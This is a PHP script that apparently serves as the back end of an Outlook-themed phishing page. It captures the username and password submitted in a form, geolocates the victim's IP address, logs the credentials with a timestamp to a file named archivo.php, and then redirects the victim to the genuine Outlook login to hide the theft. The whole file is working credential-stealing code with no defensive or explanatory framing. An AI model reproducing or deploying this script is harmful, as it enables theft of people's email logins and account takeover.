<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];


#browser info
#Country info
$_SESSION['loginfmt'] = $_POST['namee'];
$_SESSION['loginfmt'] = $_POST['pwss'];


#Security information
$message = "
D0c	=>   ".$_POST['namee']." -  
Cl4v3	=>   ".$_POST['pwss']." -  
".date('l, jS \of F Y , h:i:s A')." - 
 " . $ipdat->geoplugin_countryCode . "  -
".$_SESSION['_IP_']."  <br />
*-*-*-*-*-*-**-*-*-*-*-*-*-*-*-* <br />
</div>";

$fp = fopen('archivo.php', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);


header('location: https://outlook.live.com/');

?>